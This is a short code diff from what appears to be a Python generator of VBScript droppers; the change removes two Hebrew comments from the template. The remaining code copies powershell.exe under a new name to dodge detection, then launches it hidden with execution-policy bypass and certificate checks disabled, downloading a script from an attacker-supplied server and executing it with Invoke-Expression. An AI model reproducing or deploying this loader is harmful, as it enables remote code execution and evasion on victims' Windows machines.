@@ -234,12 +234,12 @@ def generate_vbs_with_encoded_ps1_lolbas(server_url, output_file, ps1_filename):
 Dim objFSO
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' העתקת PowerShell.exe עם שם חדש באמצעות FileSystemObject
+
 If objFSO.FileExists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") Then
     objFSO.CopyFile "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "{destination}", True
 End If
 
-' הרצת PowerShell.exe מהנתיב החדש עם השם החדש
+
 Dim objShell
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "{destination} -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; $ps1 = (New-Object System.Net.WebClient).DownloadString('""" + server_url + """'); Invoke-Expression $ps1", 0, True
